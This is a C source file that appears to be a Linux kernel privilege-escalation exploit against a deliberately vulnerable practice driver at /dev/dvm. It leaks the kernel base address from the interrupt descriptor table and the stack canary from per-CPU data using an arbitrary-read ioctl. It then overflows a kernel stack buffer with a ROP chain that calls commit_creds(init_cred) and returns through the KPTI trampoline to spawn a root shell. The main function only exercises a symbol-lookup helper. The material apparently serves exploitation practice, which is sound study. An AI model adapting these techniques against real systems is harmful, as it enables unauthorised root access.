#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdint.h>
#include <string.h>
#include <sys/ioctl.h>

#include <libuallsyms/uallsyms.h>

#define DVM_IOCTL_MAGIC 37
#define DVM_IOCTL_AAR _IOWR(DVM_IOCTL_MAGIC, 0, struct aar_req)
#define DVM_IOCTL_BOF _IOW(DVM_IOCTL_MAGIC, 1, struct bof_req)

#define __user

#define IDT_BASE 0xfffffe0000000000
#define IDT_LEAK_OFFSET 0x1008e00
#define COMMIT_CREDS_OFF 0xb76b0
#define INIT_CRED_OFF 0x1a52fc0
#define PCPU_BASE_ADDR_OFF 0x17c2158
#define KPTI_TREMPOLINE_OFF 0x10016e1
#define POP_RDI_OFF 0x6b0f0

struct aar_req {
    void __user *to;
    void *from;
    unsigned int n;
};

struct bof_req {
    void __user *from;
    unsigned int n;
};

char g_buf[0x10000];

void die(const char *msg)
{
    perror(msg);
    exit(EXIT_FAILURE);
}

void spawn_shell(void)
{
    char *const argv[] = {
        "/bin/sh",
        NULL
    };

    execve("/bin/sh", argv, NULL);
    exit(0);
}

uint64_t resolve_kernel_base(int mod_fd)
{
    int ret;
    struct aar_req areq;
    uint64_t kernel_base;

    areq.to = g_buf;
    areq.from = (void *)(IDT_BASE + 4);
    areq.n = 8;

    ret = ioctl(mod_fd, DVM_IOCTL_AAR, &areq);
    if (ret < 0)
        die("ioctl");

    kernel_base = *(uint64_t *)g_buf - IDT_LEAK_OFFSET;

    return kernel_base;
}

uint64_t resolve_canary(int mod_fd, uint64_t kernel_base)
{
    uint64_t pcpu_base_addr;
    uint64_t kernel_gs;
    uint64_t canary;
    struct aar_req areq;
    int ret;

    pcpu_base_addr = kernel_base + PCPU_BASE_ADDR_OFF;

    areq.to = g_buf;
    areq.from = (void *)(pcpu_base_addr);
    areq.n = 8;

    ret = ioctl(mod_fd, DVM_IOCTL_AAR, &areq);
    if (ret < 0)
        die("ioctl");

    kernel_gs = *(uint64_t *)g_buf;

    areq.to = g_buf;
    areq.from = (void *)(kernel_gs + 0x28);
    areq.n = 8;

    ret = ioctl(mod_fd, DVM_IOCTL_AAR, &areq);
    if (ret < 0)
        die("ioctl");

    canary = *(uint64_t *)g_buf;

    return canary;
}

void do_rop(int mod_fd, uint64_t kernel_base, uint64_t canary)
{
    uint64_t commit_creds;
    uint64_t init_cred;
    uint64_t kpti_trampoline;
    uint64_t pop_rdi;
    struct bof_req breq;
    int ret;

    commit_creds = kernel_base + COMMIT_CREDS_OFF;
    init_cred = kernel_base + INIT_CRED_OFF;
    kpti_trampoline = kernel_base + KPTI_TREMPOLINE_OFF;
    pop_rdi = kernel_base + POP_RDI_OFF;

    *(uint64_t *)(g_buf + 0x1) = canary; /* canary */
    *(uint64_t *)(g_buf + 0x9) = pop_rdi;
    *(uint64_t *)(g_buf + 0x11) = init_cred;
    *(uint64_t *)(g_buf + 0x19) = commit_creds;
    *(uint64_t *)(g_buf + 0x21) = kpti_trampoline;
    *(uint64_t *)(g_buf + 0x29) = 0;
    *(uint64_t *)(g_buf + 0x31) = 0; 
    *(uint64_t *)(g_buf + 0x39) = (uint64_t)spawn_shell; /* rip */ 
    *(uint64_t *)(g_buf + 0x41) = 0x33; /* cs */
    *(uint64_t *)(g_buf + 0x49) = 0x206; /* rflags */
    *(uint64_t *)(g_buf + 0x51) = (uint64_t)__builtin_frame_address(0); /* rsp */
    *(uint64_t *)(g_buf + 0x59) = 0x2b; /* ss */

    breq.from = g_buf;
    breq.n = 0x61;

    ret = ioctl(mod_fd, DVM_IOCTL_BOF, &breq);
    if (ret < 0)
        die("ioctl");
}

int dvm_aar(void *to, void *from, size_t n)
{
    struct aar_req areq;
    int mod_fd;
    int ret;

    mod_fd = open("/dev/dvm", O_RDWR);
    if (mod_fd < 0)
        return -1;

    areq.to = to;
    areq.from = from;
    areq.n = n;

    ret = ioctl(mod_fd, DVM_IOCTL_AAR, &areq);
    if (ret < 0)
        return -1;

    close(mod_fd);

    return ret;
}

int main(void)
{
    uas_t *uas;

    uas = uas_init(dvm_aar);
    
    uas_lookup_name(uas, "test");

    return 0;
}

